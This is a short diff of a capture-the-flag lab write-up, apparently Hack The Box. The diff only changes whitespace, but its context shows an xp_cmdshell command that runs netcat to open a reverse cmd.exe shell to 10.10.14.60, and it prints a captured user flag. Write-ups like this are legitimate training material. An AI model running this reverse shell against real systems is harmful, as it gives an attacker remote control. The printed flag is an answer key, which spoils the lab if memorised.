@@ -95,11 +95,12 @@ xp_cmdshell "C:\\Users\\sql_svc\\Downloads\\nc64.exe -e cmd.exe 10.10.14.60 443"
     ```bash
    cd C:\Users\sql_svc\Desktop
    type user.txt
-    ```
+   ```
 
 In this part we can get the user flag: 3e7b102e78218e935bf3f4951fec21a3
 
 ![scan port](./image/Task5_get_user.jpg)
+
 
 9. Now, we need to get the root flag:
 
